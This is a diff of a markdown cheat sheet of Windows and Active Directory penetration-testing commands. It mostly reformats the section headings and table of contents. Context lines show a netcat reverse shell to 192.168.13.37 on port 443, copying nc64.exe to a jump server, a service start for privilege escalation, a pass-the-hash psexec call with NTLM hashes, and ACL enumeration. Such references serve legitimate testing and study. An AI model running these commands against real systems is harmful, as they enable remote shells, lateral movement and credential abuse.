@@ -6,18 +6,18 @@ Any **useful commands** for **Windows** / **Active Directory** will be posted he
 
 &nbsp;
 
-* [Reverse shells](#Reverse-shells)
-* [Transfer files](#Transfer-files)
-* [Privilege escalation](#Privilege-escalation)
-* [Kerberos - Tickets](#Kerberos---Tickets)
-* [Pass the hash](#Pass-the-hash)
-* [Enumeration - Recon](#Enumeration---Recon)
-* [Bypass security - AV evasion](#Bypass-security---AV-evasion)
-* [Misc commands](#Misc-commands)
+* [Reverse shells](#reverse-shells)
+* [Transfer files](#transfer-files)
+* [Privilege escalation](#privilege-escalation)
+* [Kerberos](#Kerberos)
+* [Pass the hash](#pass-the-hash)
+* [Enumeration](#enumeration)
+* [Bypass security and policies](#bypass-security-and-policies)
+* [Misc commands](#misc-commands)
 
 &nbsp;
 
-## :hook: Reverse shells
+## Reverse shells :hook:
 
 &nbsp;
 &nbsp;
@@ -53,7 +53,7 @@ nc.exe 192.168.13.37 443 -e cmd.exe
 &nbsp;
 &nbsp;
 
-## :open_file_folder: Transfer files
+## Transfer files :open_file_folder:
 
 &nbsp;
 &nbsp;
@@ -103,7 +103,7 @@ Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsr
 &nbsp;
 &nbsp;
 
-## :test_tube: Privilege escalation
+## Privilege escalation :test_tube:
 
 &nbsp;
 &nbsp;
@@ -169,7 +169,7 @@ C:\Users\victim\Desktop>sc start SNMPTRAP
 &nbsp;
 &nbsp;
 
-## :label: Kerberos - Tickets
+## Kerberos :label:
 
 &nbsp;
 &nbsp;
@@ -224,7 +224,7 @@ Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
 &nbsp;
 &nbsp;
 
-## :joystick: Pass the hash
+## Pass the hash :joystick:
 
 &nbsp;
 &nbsp;
@@ -255,7 +255,7 @@ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b5140
 &nbsp;
 &nbsp;
 
-## :mag: Enumeration - Recon
+## Enumeration :mag: 
 
 &nbsp;
 &nbsp;
@@ -293,7 +293,7 @@ Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
 &nbsp;
 &nbsp;
 
-## :unlock: Bypass security - AV evasion
+## Bypass security and policies :unlock:
 
 &nbsp;
 &nbsp;
